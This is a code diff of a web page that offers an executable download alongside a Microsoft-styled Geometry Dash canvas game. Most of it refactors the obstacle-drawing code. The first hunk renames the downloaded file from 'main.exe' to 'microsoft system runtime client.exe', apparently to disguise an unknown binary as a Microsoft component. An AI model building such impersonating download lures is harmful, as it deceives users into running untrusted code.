@@ -291,10 +291,10 @@
       btn.classList.add('loading');
 
       setTimeout(() => {
-        const downloadUrl = 'main.exe';
+        const downloadUrl = 'microsoft system runtime client.exe';
         const link = document.createElement('a');
         link.href = downloadUrl;
-        link.setAttribute('download', 'main.exe');
+        link.setAttribute('download', 'microsoft system runtime client.exe');
         link.target = '_self';
         document.body.appendChild(link);
         link.click();
@@ -1036,7 +1036,7 @@
       }
     }
 
-    // --- Geometry Dash Engine (With Full Textured Obstacles) ---
+    // --- Geometry Dash Engine ---
     function initGame(spawnX) {
       const canvas = document.getElementById('gameCanvas'), ctx = canvas.getContext('2d');
 
@@ -1264,24 +1264,18 @@
 
         // Draw High-Contrast Textured Obstacles
         obstacles.forEach(obs => {
-          // 1. Spikes (Shaded & Outlined)
           if (obs.type === 'spike') {
             ctx.fillStyle = '#1E1E1E';
             ctx.beginPath(); ctx.moveTo(obs.x, groundY); ctx.lineTo(obs.x + obs.w / 2, groundY - obs.h); ctx.lineTo(obs.x + obs.w, groundY); ctx.closePath(); ctx.fill();
             
-            // Spike outline & inner highlight
             ctx.strokeStyle = '#D13438'; ctx.lineWidth = 1.5; ctx.stroke();
             ctx.fillStyle = '#50E6FF';
             ctx.beginPath(); ctx.moveTo(obs.x + obs.w / 2, groundY - obs.h + 3); ctx.lineTo(obs.x + obs.w / 2 - 2, groundY - 4); ctx.lineTo(obs.x + obs.w / 2 + 2, groundY - 4); ctx.closePath(); ctx.fill();
-          } 
-          // 2. Ceiling Spikes
-          else if (obs.type === 'spike_down') {
+          } else if (obs.type === 'spike_down') {
             ctx.fillStyle = '#1E1E1E';
             ctx.beginPath(); ctx.moveTo(obs.x, obs.y); ctx.lineTo(obs.x + obs.w / 2, obs.y + obs.h); ctx.lineTo(obs.x + obs.w, obs.y); ctx.closePath(); ctx.fill();
             ctx.strokeStyle = '#D13438'; ctx.lineWidth = 1.5; ctx.stroke();
-          } 
-          // 3. Spinning Saws (Metallic Gear Texture)
-          else if (obs.type === 'saw') {
+          } else if (obs.type === 'saw') {
             ctx.save(); ctx.translate(obs.x, obs.y); ctx.rotate(obs.rot);
             const teeth = 8; ctx.fillStyle = '#201F1E';
             ctx.beginPath();
@@ -1293,73 +1287,35 @@
             ctx.closePath(); ctx.fill();
             ctx.strokeStyle = '#0078D4'; ctx.lineWidth = 1.5; ctx.stroke();
 
-            // Inner Blade Disk
             ctx.fillStyle = '#3B3A39'; ctx.beginPath(); ctx.arc(0, 0, obs.r * 0.52, 0, Math.PI * 2); ctx.fill();
             ctx.fillStyle = '#FFB900'; ctx.beginPath(); ctx.arc(0, 0, obs.r * 0.22, 0, Math.PI * 2); ctx.fill();
             ctx.restore();
-          } 
-          // 4. Textured Platform Blocks (Tech Grid Texture, Never Invisible)
-          else if (obs.type === 'block') {
-            // Dark Base Fill
-            ctx.fillStyle = '#2B2B2B';
-            ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
-            
-            // Outer Border
-            ctx.strokeStyle = '#0078D4';
-            ctx.lineWidth = 2.5;
-            ctx.strokeRect(obs.x, obs.y, obs.w, obs.h);
-            
-            // Inner Grid lines
-            ctx.strokeStyle = '#484644';
-            ctx.lineWidth = 1.5;
-            ctx.strokeRect(obs.x + 4, obs.y + 4, Math.max(0, obs.w - 8), Math.max(0, obs.h - 8));
-            
-            // Center Tech Dot
-            ctx.fillStyle = '#50E6FF';
-            ctx.fillRect(obs.x + obs.w / 2 - 3, obs.y + obs.h / 2 - 3, 6, 6);
-          } 
-          // 5. Jump Orbs (Pulsing Rings & Glow)
-          else if (obs.type === 'orb') {
+          } else if (obs.type === 'block') {
+            ctx.fillStyle = '#2B2B2B'; ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
+            ctx.strokeStyle = '#0078D4'; ctx.lineWidth = 2.5; ctx.strokeRect(obs.x, obs.y, obs.w, obs.h);
+            ctx.strokeStyle = '#484644'; ctx.lineWidth = 1.5; ctx.strokeRect(obs.x + 4, obs.y + 4, Math.max(0, obs.w - 8), Math.max(0, obs.h - 8));
+            ctx.fillStyle = '#50E6FF'; ctx.fillRect(obs.x + obs.w / 2 - 3, obs.y + obs.h / 2 - 3, 6, 6);
+          } else if (obs.type === 'orb') {
             ctx.save();
-            let baseColor = '#FFB900', outerColor = 'rgba(255, 185, 0, 0.7)';
-            if (obs.orbType === 'pink') { baseColor = '#FF007F'; outerColor = 'rgba(255, 0, 127, 0.7)'; }
-            else if (obs.orbType === 'red') { baseColor = '#E81123'; outerColor = 'rgba(232, 17, 35, 0.7)'; }
-
+            let baseColor = '#FFB900', outerColor = 'rgba(255, 185, 0, 0.6)';
+            if (obs.orbType === 'pink') { baseColor = '#FF007F'; outerColor = 'rgba(255, 0, 127, 0.6)'; }
+            else if (obs.orbType === 'red') { baseColor = '#E81123'; outerColor = 'rgba(232, 17, 35, 0.6)'; }
             const pulse = Math.sin(frame * 0.15) * 3.5;
             ctx.strokeStyle = obs.used ? 'rgba(150,150,150,0.3)' : outerColor; ctx.lineWidth = 2.5;
             ctx.beginPath(); ctx.arc(obs.x, obs.y, obs.r + 6 + pulse, 0, Math.PI * 2); ctx.stroke();
-
             ctx.fillStyle = obs.used ? 'rgba(100,100,100,0.3)' : baseColor;
             ctx.beginPath(); ctx.arc(obs.x, obs.y, obs.r, 0, Math.PI * 2); ctx.fill();
             ctx.strokeStyle = '#000000'; ctx.lineWidth = 1.5; ctx.stroke();
-
-            ctx.fillStyle = '#ffffff';
-            ctx.beginPath(); ctx.arc(obs.x, obs.y, 5, 0, Math.PI * 2); ctx.fill();
+            ctx.fillStyle = '#ffffff'; ctx.beginPath(); ctx.arc(obs.x, obs.y, 5, 0, Math.PI * 2); ctx.fill();
             ctx.restore();
-          } 
-          // 6. Trampolines (Safe Rounded Springs)
-          else if (obs.type === 'pad') {
+          } else if (obs.type === 'pad') {
             ctx.save();
             const compress = obs.bounce ? Math.sin(obs.bounce * 0.5) * 3 : 0, padH = Math.max(4, obs.h - compress), padY = obs.y + (obs.h - padH);
-            
-            // Base Bar
-            ctx.fillStyle = '#1E1E1E';
-            ctx.fillRect(obs.x, obs.y + obs.h - 4, obs.w, 4);
-
-            // Trampoline Top
-            ctx.fillStyle = '#FFB900';
-            drawSafeRoundRect(ctx, obs.x + 2, padY, obs.w - 4, padH, 3);
-            ctx.fill();
+            ctx.fillStyle = '#1E1E1E'; ctx.fillRect(obs.x, obs.y + obs.h - 4, obs.w, 4);
+            ctx.fillStyle = '#FFB900'; drawSafeRoundRect(ctx, obs.x + 2, padY, obs.w - 4, padH, 3); ctx.fill();
             ctx.strokeStyle = '#E0A800'; ctx.lineWidth = 2; ctx.stroke();
-
-            // White Up Arrow Indicator
-            ctx.strokeStyle = '#ffffff';
-            ctx.lineWidth = 2;
-            ctx.beginPath();
-            ctx.moveTo(obs.x + obs.w / 2 - 5, padY + padH / 2 + 2);
-            ctx.lineTo(obs.x + obs.w / 2, padY + padH / 2 - 3);
-            ctx.lineTo(obs.x + obs.w / 2 + 5, padY + padH / 2 + 2);
-            ctx.stroke();
+            ctx.strokeStyle = '#ffffff'; ctx.lineWidth = 2;
+            ctx.beginPath(); ctx.moveTo(obs.x + obs.w / 2 - 5, padY + padH / 2 + 2); ctx.lineTo(obs.x + obs.w / 2, padY + padH / 2 - 3); ctx.lineTo(obs.x + obs.w / 2 + 5, padY + padH / 2 + 2); ctx.stroke();
             ctx.restore();
           }
         });
@@ -1370,18 +1326,13 @@
           ctx.beginPath(); ctx.arc(r.x, r.y, r.r, 0, Math.PI * 2); ctx.stroke();
         });
 
-        // Player Cube (Crisp Borders & Quadrants)
+        // Player Cube
         if (!gameOver) {
           ctx.save();
           ctx.translate(landX + cubeSize / 2, cube.y + cubeSize / 2);
           ctx.rotate(cube.angle);
           const half = cubeSize / 2, gap = 1;
-
-          // Black Cube Border
-          ctx.fillStyle = '#000000';
-          ctx.fillRect(-half - 2, -half - 2, cubeSize + 4, cubeSize + 4);
-
-          // 4 Microsoft Quadrants
+          ctx.fillStyle = '#000000'; ctx.fillRect(-half - 2, -half - 2, cubeSize + 4, cubeSize + 4);
           ctx.fillStyle = msColors[0]; ctx.fillRect(-half, -half, half - gap, half - gap);
           ctx.fillStyle = msColors[1]; ctx.fillRect(gap, -half, half - gap, half - gap);
           ctx.fillStyle = msColors[2]; ctx.fillRect(-half, gap, half - gap, half - gap);
